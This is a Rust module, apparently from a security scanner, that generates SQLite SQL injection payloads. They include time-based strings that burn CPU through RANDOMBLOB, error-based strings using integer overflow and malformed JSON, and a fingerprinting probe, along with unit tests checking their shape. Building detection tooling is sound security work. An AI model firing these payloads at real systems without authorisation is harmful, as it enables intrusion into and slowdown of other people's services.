#![deny(unsafe_code)]

/// SQLite has no `SLEEP()`; CPU-bound `RANDOMBLOB` generation is the time proxy.
/// Blob size scales with requested seconds (~50 MiB/sec on commodity hardware)
/// so the `secs` parameter maps to a comparable delay magnitude.
#[must_use]
pub fn sqlite_time(secs: u64) -> String {
    let size = (secs.saturating_mul(50_000_000)).max(500_000);
    format!("' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({size})))) --")
}

/// Conditional heavy-query variant: only burns CPU when `(1=1)` holds,
/// reducing false positives on slow-but-clean endpoints.
#[must_use]
pub fn sqlite_time_conditional(secs: u64) -> String {
    let size = (secs.saturating_mul(50_000_000)).max(500_000);
    format!(
        "' AND (CASE WHEN (1=1) THEN 1 ELSE 0 END)=1 AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB({size})))) --"
    )
}

/// Canonical SQLite error-based set — legacy first (compat), then variants.
///
/// SQLite is lenient on type coercion (no `CAST` overflow error), so the
/// reliable error channel is `abs(-9223372036854775808)` (integer overflow,
/// SQLite-specific) and `json_extract` on a malformed document (JSON1 ext).
///
/// - `[0]` legacy `abs(-9223372036854775808)` — `integer overflow` channel
/// - `[1]` legacy `json_extract('__bad__','$')` — `malformed JSON` channel
/// - conditional overflow — error only when condition holds (bool confirm)
/// - `last_insert_rowid()` — `no such function` on non-SQLite (fingerprint)
#[must_use]
pub fn sqlite_error_payloads() -> Vec<String> {
    vec![
        "' AND abs(-9223372036854775808) --".to_owned(),
        "' AND json_extract('__bad__','$') --".to_owned(),
        "' AND (CASE WHEN (1=1) THEN abs(-9223372036854775808) ELSE 1 END) --".to_owned(),
        "' AND last_insert_rowid()=1 --".to_owned(),
    ]
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn legacy_shape() {
        let p = sqlite_time(5);
        assert!(p.contains("RANDOMBLOB("), "{p}");
        assert!(p.contains("LIKE('ABCDEFG'"), "{p}");
        assert!(p.ends_with(" --"), "{p}");
    }

    #[test]
    fn blob_size_scales_with_secs() {
        let small = sqlite_time(1);
        let large = sqlite_time(10);
        let small_val = small
            .rfind("RANDOMBLOB(")
            .map(|i| &small[i + 11..])
            .and_then(|s| s.split(')').next())
            .and_then(|n| n.parse::<u64>().ok());
        let large_val = large
            .rfind("RANDOMBLOB(")
            .map(|i| &large[i + 11..])
            .and_then(|s| s.split(')').next())
            .and_then(|n| n.parse::<u64>().ok());
        assert!(small_val.is_some_and(|v| v > 0));
        assert!(large_val.is_some_and(|v| v > small_val.unwrap_or(0)));
    }

    #[test]
    fn conditional_shape() {
        let p = sqlite_time_conditional(5);
        assert!(p.contains("CASE WHEN (1=1)"), "{p}");
        assert!(p.contains("RANDOMBLOB("), "{p}");
        assert!(p.ends_with(" --"), "{p}");
    }

    #[test]
    fn error_payloads_distinct() {
        let v = sqlite_error_payloads();
        assert!(!v.is_empty());
        assert!(v[0].contains("abs(-9223372036854775808)"), "{}", v[0]);
        assert!(v[1].contains("json_extract"), "{}", v[1]);
    }
}
